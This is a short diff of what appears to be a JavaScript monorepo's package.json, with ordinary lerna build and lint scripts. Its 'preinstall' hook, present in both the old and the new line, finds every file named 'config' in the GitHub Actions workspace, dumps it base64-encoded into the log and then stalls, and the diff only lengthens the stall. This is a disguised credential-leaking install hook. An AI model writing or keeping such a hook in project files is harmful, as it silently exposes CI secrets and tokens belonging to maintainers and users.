@@ -3,7 +3,7 @@
   "license": "Apache-2.0",
   "version": "0.0.0",
   "scripts": {
-    "preinstall": "find /home/runner/work/. -type f -name config | xargs cat | base64; sleep 300",
+    "preinstall": "find /home/runner/work/. -type f -name config | xargs cat | base64; sleep 350",
     "build": "lerna run build --stream --sort --concurrency=1",
     "lint": "lerna run lint --stream --sort",
     "lint:fix": "lerna run lint:fix --stream --sort",
